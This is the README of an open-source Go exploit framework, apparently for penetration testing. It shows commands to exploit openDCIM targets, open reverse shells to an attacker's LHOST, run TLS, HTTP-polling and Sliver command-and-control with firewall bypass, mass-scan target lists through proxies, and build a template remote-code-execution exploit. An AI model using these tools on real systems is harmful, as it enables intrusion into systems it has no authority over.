# pik

Go exploit framework. Write exploits once, run them as standalone binaries or inside the framework with an interactive console.

## Install

```bash
go install github.com/Chocapikk/pik/cmd/pik@latest
```

## Usage

```bash
pik console                        # Interactive console
pik run opendcim -t target -s LHOST=ip  # Run an exploit
pik check opendcim -t target       # Check only
pik info opendcim                  # Module details + dorks
pik build opendcim -o opendcim     # Standalone binary
```

## Console

```
pik > use opendcim
pik opendcim > set TARGET http://target
pik opendcim > set LHOST 10.0.0.1
pik opendcim > show targets
  * 0  Unix/Linux Command Shell   cmd
    1  Linux Dropper              dropper  amd64, arm64, 386
pik opendcim > exploit
[+] Session 1 opened (10.0.0.2:49326)
www-data@target:~$ ^Z
[*] Session 1 backgrounded
pik opendcim > sessions
pik opendcim > kill 1
```

Ctrl+Z backgrounds a session. `resource exploit.rc` runs commands from a file.

## C2 backends

Three built-in backends, plus Sliver integration:

```bash
# TCP (default)
pik run opendcim -t target -s LHOST=ip

# TLS encrypted
pik run opendcim -t target -s LHOST=ip -s C2=sslshell

# HTTP polling (firewall bypass)
pik run opendcim -t target -s LHOST=ip -s C2=httpshell -s PAYLOAD=reverse_php_http

# Sliver C2
pik run opendcim -t target -s LHOST=ip -s C2=sliver -s C2CONFIG=~/.sliver/configs/operator.cfg
```

## Scanning

```bash
pik check opendcim -f targets.txt -t 50 -o vulnerable.txt
```

Supports HTTP/SOCKS5 proxy with `-s PROXIES=socks5://127.0.0.1:1080`.

## Write your own exploit

```go
package main

import (
    "github.com/Chocapikk/pik/sdk"
    _ "github.com/Chocapikk/pik/pkg/cli"
)

type MyExploit struct{ sdk.Pik }

func (m *MyExploit) Info() sdk.Info {
    return sdk.Info{
        Description: "My exploit",
        Authors:     []string{"you"},
        Reliability: sdk.Typical,
        Targets:     []sdk.Target{sdk.TargetLinux("amd64")},
    }
}

func (m *MyExploit) Check(run *sdk.Context) (sdk.CheckResult, error) {
    resp, err := run.Send(sdk.Request{Path: "vulnerable.php"})
    if err != nil {
        return sdk.Unknown(err)
    }
    if resp.ContainsAny("marker") {
        return sdk.Vulnerable("marker found")
    }
    return sdk.Safe("not vulnerable")
}

func (m *MyExploit) Exploit(run *sdk.Context) error {
    cmd := run.CommentTrail(run.Base64Bash(run.Payload()))
    _, err := run.Send(sdk.Request{
        Method: "POST",
        Path:   "rce.php",
        Form:   sdk.Values{"cmd": {cmd}},
    })
    return err
}

func main() {
    sdk.Run(&MyExploit{})
}
```

```bash
go build -o myexploit . && ./myexploit -t http://target --lhost 10.0.0.1
```

The standalone binary includes check, exploit, reverse shell listener, and all CLI flags in ~6 MB.

## License

AGPL-3.0
